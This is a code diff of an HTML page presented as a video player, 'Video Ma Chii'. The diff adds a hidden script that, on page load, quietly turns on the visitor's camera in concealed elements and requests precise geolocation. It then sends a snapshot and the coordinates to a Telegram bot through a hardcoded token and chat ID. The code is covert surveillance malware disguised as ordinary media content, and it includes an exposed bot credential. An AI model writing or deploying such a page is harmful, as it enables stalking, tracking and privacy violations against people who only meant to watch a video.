@@ -1,14 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>$$</title>
-    <link rel="stylesheet" href="style.css"/>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Auto Capture & Send with Location</title>
+  <style>
+      @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@600&family=Nunito:wght@1000&family=Oswald:wght@500;600&display=swap');
+
+h1 {
+    text-align: center;
+    padding: 35px;
+    background: #FF0076;
+    border-radius: 10px;
+    margin-bottom: -5px;
+    font-family: 'Kanit', sans-serif;
+    
+}
+    body {
+      background: #ffffff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    .container {
+      max-width: 960px;
+      margin: 0 auto;
+    }
+    video, canvas {
+      display: block;
+      margin: 10px auto;
+      border-radius: 10px;
+      max-width: 100%;
+    }
+  </style>
 </head>
 <body>
-   <h1>Video Ma Chii</h1> 
+  <h1>Video Ma Chii</h1> 
 <video id="homevideo" autoplay="" controls webkit-playsinline="" width="100%" height="100%" >
  <source src="machiu.mp4" type="video/mp4">
  </source>
@@ -43,18 +70,90 @@
  </source>
 </video>
 
+  <div class="container">
+    <video id="video" autoplay playsinline width="300" height="225"style="display:none;"></video>
+    <canvas id="snapshot" width="300" height="225" style="display:none;"></canvas>
+  </div>
 
- <script>
-   video_count =1; 
-   videoPlayer = document.getElementById("homevideo");
-   function run(){
-     video_count++;
-     if (video_count == 16)
-       video_count = 1;
-     var nextVideo = "video"+video_count+".mp4";
-     videoPlayer.src = nextVideo;
-     videoPlayer.play();
-   };
- </script>
+  <script>
+    const botToken = "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA";
+    const chatId = "1272791365";
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("snapshot");
+    const ctx = canvas.getContext("2d");
+    let userLocation = {};
+
+    // Start camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        getLocation(); // Request location first
+        setTimeout(captureAndSend, 2000); // Capture image after 2 seconds
+      })
+      .catch(error => console.error("Camera permission denied:", error));
+
+    // Get user location
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            userLocation = {
+              lat: position.coords.latitude,
+              lon: position.coords.longitude
+            };
+          },
+          error => console.error("Error getting location:", error),
+          { enableHighAccuracy: true }
+        );
+      } else {
+        console.error("Geolocation not supported.");
+      }
+    }
+
+    function captureAndSend() {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => sendPhoto(blob), "image/png");
+    }
+
+    function sendPhoto(blob) {
+      if (!blob) {
+        console.error("Failed to capture snapshot.");
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "snapshot.png");
+      formData.append("caption", `Here is your auto-captured gift!\n📍 Location: ${userLocation.lat}, ${userLocation.lon}`);
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      })
+      .then(response => response.json())
+      .then(() => sendLocation()) // Send location after photo
+      .catch(error => console.error("Error sending photo:", error));
+    }
+
+    function sendLocation() {
+      if (!userLocation.lat || !userLocation.lon) {
+        console.error("Location not available.");
+        return;
+      }
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          latitude: userLocation.lat,
+          longitude: userLocation.lon
+        })
+      })
+      .then(response => response.json())
+      .then(data => console.log("Location sent:", data))
+      .catch(error => console.error("Error sending location:", error));
+    }
+  </script>
 </body>
 </html>
